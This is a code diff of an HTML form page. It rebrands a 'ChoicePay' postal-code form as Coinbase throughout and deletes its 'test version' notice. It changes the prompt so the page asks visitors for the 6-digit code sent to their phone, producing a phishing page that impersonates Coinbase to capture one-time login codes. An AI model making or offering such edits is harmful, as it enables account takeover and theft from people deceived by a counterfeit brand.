@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ChoicePay | Postal code</title>
+  <title>Coinbase | Postal code</title>
   <meta name="theme-color" content="#1d4ed8" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -114,27 +114,27 @@
         <rect x="1" y="1" width="38" height="38" rx="11" fill="#ffffff" stroke="#dbe5fb" stroke-width="1.5" />
         <path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#1d4ed8" stroke-width="5" stroke-linecap="round" />
       </svg>
-      ChoicePay
+      Coinbase
     </div>
   </header>
 
   <main>
     <section class="card">
-      <div class="notice">This is a test version and file may not be sent.</div>
+      <div class="notice">sign in to continue.</div>
 
-      <h1>Enter the 6-digit postal code of your address</h1>
-      <p class="hint">Numbers only. We use this to confirm your location.</p>
+      <h1>Enter the 6-digit code sent to your phone number</h1>
+      <p class="hint">sign in</p>
 
       <form id="postal-form" novalidate>
         <!-- Spam trap: real people never tick this -->
         <input type="checkbox" name="botcheck" class="hidden" tabindex="-1" autocomplete="off" />
 
-        <label for="postal">Postal code</label>
+        <label for="postal">Enter code</label>
         <input type="text" id="postal" name="postal_code" inputmode="numeric" autocomplete="postal-code"
                pattern="[0-9]{6}" placeholder="000000" required />
         <div class="error" id="error" role="alert"></div>
 
-        <button type="submit" id="submit-btn">Submit</button>
+        <button type="sign-in" id="submit-btn">Submit</button>
         <p class="privacy">Visits and your device and browser type are recorded.</p>
       </form>
     </section>
@@ -146,7 +146,7 @@
         <rect x="1" y="1" width="38" height="38" rx="11" fill="#ffffff" stroke="#dbe5fb" stroke-width="1.5" />
         <path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#1d4ed8" stroke-width="5" stroke-linecap="round" />
       </svg>
-      <span>&copy; <span id="year">2026</span> <strong>ChoicePay</strong>. All rights reserved.</span>
+      <span>&copy; <span id="year">2026</span> <strong>Coinbase</strong>. All rights reserved.</span>
     </div>
   </footer>
 
